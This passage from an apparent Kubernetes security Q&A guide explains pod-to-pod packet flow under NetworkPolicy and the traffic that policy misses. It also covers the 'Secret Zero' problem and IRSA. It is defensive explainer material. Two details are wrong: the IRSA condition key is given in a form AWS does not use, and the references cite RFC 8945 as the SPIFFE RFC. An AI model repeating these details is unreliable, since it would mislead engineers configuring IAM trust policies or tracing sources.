1. Pod A's application sends data to the socket → kernel TCP stack creates TCP segment.
2. The kernel looks up the routing table: destination `10.0.2.8` is within the cluster CIDR → route via `eth0` (the pod's virtual ethernet interface in its net namespace).
3. Traffic exits pod A's network namespace via `veth0`, enters the node's network namespace via `eth0` of the host-side veth pair.
4. **CNI plugin's enforcement**: Calico's eBPF program (or iptables chain if using legacy mode) is attached to the veth interface. It evaluates: "Is there a NetworkPolicy that allows pod B to receive traffic from pod A?" It checks the source IP against allowed pod selectors.
5. If allowed: packet is forwarded to pod B's veth pair and enters pod B's network namespace.
6. Pod B's TCP stack reassembles and delivers to the socket.

NetworkPolicy enforcement happens at the **kernel level** on the **wire** — either via iptables rules or eBPF programs on veth interfaces. It's not application-level.

**What NetworkPolicy does NOT protect:**

- **Same pod**: containers in the same pod share a network namespace. No NetworkPolicy between them.
- **hostNetwork pods**: a pod with `hostNetwork: true` runs in the node's network namespace. It bypasses all NetworkPolicy (there's no veth to attach enforcement to).
- **Node-to-pod traffic**: the kubelet's health check traffic comes from the node, not from a pod. It bypasses NetworkPolicy because it originates outside the pod network.
- **Traffic from the control plane**: the API server reaching kubelets, or kubelets reaching each other, is not subject to NetworkPolicy.
- **Layer 7**: NetworkPolicy is L3/L4 only (IP + port). It cannot filter based on HTTP method, URL path, or JWT claims. That requires a service mesh AuthorizationPolicy (Istio) or an API gateway.

---

### Q5: What is the "Secret Zero" problem in Kubernetes, and how do projected ServiceAccount tokens and IRSA (IAM Roles for Service Accounts) solve it differently?

**Direct answer:**

Secret Zero: when a pod needs credentials to fetch other credentials (e.g., a pod needs an AWS access key to fetch a database password from AWS Secrets Manager), how does it prove its identity to get that first credential? If the credential is hardcoded in a Kubernetes Secret or environment variable, you've just pushed the problem one level up — now you need to protect THAT secret. If the credential is embedded in the image, anyone with the image has the credential.

**Projected ServiceAccount tokens** solve this using Kubernetes as the identity provider. The kubelet projects a short-lived, audience-bound JWT directly into the pod's filesystem. This JWT is signed by the Kubernetes OIDC key pair. The pod presents this JWT to an external service (Vault, AWS STS, GCP STS). That service calls Kubernetes's OIDC discovery endpoint to verify the signature, and if valid, accepts the pod's identity claim. No pre-provisioned credentials. The pod's identity is established by the fact that it's running in Kubernetes (the kubelet wouldn't give it a token otherwise).

**IRSA (IAM Roles for Service Accounts)** is AWS's implementation of this for AWS credentials. The EKS cluster's OIDC provider URL is registered in AWS IAM. An IAM role is annotated with which Kubernetes service account can assume it (`sts:AssumeRoleWithWebIdentity`, `Condition: {"StringEquals": {"eks.amazonaws.com/oidc": "system:serviceaccount:payments:payment-api"}}`). The pod presents its projected token to `sts.amazonaws.com` → STS verifies the JWT → issues temporary AWS credentials. The pod never had a long-lived access key — it bootstrapped from the Kubernetes OIDC token, which itself requires no pre-provisioning.

The key difference: IRSA delegates trust from Kubernetes to AWS IAM. The OIDC issuer is Kubernetes; the resource owner is AWS. The pod needs NO secrets configured in advance — only the correct service account annotation and the IAM role trust policy.

---

*End of document. This breakdown should be revisited when: Kubernetes releases a new minor version with security-relevant changes, when CNI plugins update their enforcement model (iptables → eBPF migration in Cilium/Calico), when SPIFFE/SPIRE 2.0 changes the workload attestation model, or when new container escape CVEs are published. The attack surface evolves with each Kubernetes release.*

---

**Critical References:**
- CIS Kubernetes Benchmark
- NSA/CISA Kubernetes Hardening Guidance (August 2022)
- MITRE ATT&CK for Kubernetes
- Kubernetes Security Documentation (kubernetes.io/docs/concepts/security/)
- Falco Runtime Security Rules Repository
- OPA/Gatekeeper Policy Library
- SPIFFE RFC (RFC 8945)
- Linux namespaces(7), capabilities(7), seccomp(2) man pages